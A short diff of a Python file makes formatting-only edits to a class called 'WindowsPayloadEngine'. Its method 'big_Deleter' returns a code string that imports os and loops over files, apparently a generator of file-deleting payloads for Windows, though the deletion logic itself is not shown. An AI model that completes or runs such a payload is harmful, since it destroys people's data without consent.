@@ -3,11 +3,9 @@
 # import getpass
 
 
-
-class WindowsPayloadEngine():
+class WindowsPayloadEngine:
 
     def big_Deleter(self):
-
         code = """
 import os
         
@@ -32,4 +30,5 @@ for file in files:
 
         return code
 
-print('D:\\'+'\\')
+
+print('D:\\' + '\\')
